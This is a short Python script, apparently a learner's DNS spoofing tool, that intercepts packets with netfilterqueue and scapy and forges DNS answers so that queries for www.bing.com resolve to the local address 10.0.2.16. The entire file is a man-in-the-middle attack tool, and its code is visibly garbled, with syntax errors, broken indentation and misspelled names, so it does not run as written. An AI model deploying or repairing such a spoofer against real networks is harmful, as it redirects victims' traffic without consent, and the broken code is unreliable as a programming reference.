#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
 scapy_packet=scapy.ip(packet.get_payload())
 if scapy_packet.haslayer()scapy.DNSR):
qname = scapy_packet[scapy.DNSQR].qname
if "www.bing.com" in qname:
   print ("[+] spooofing target")
  answer = scapy.DNSRR(RRNAME = QNAME,rdata="10.0.2.16")
 scapy_packet[scapy.DNS].an=answer
scapy_packet[scapy.DNS].ancount=1


del scapy_packet[scapy.ip].len
del scapy_packet[scapy.ip].chksum
del scapy_packet[scapy.UDP].chksum
del scapy_packet[scapy.UDP].len


packet.set_payload(str(scapy_packet))
packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0 ,processs_packet)
queue,run()
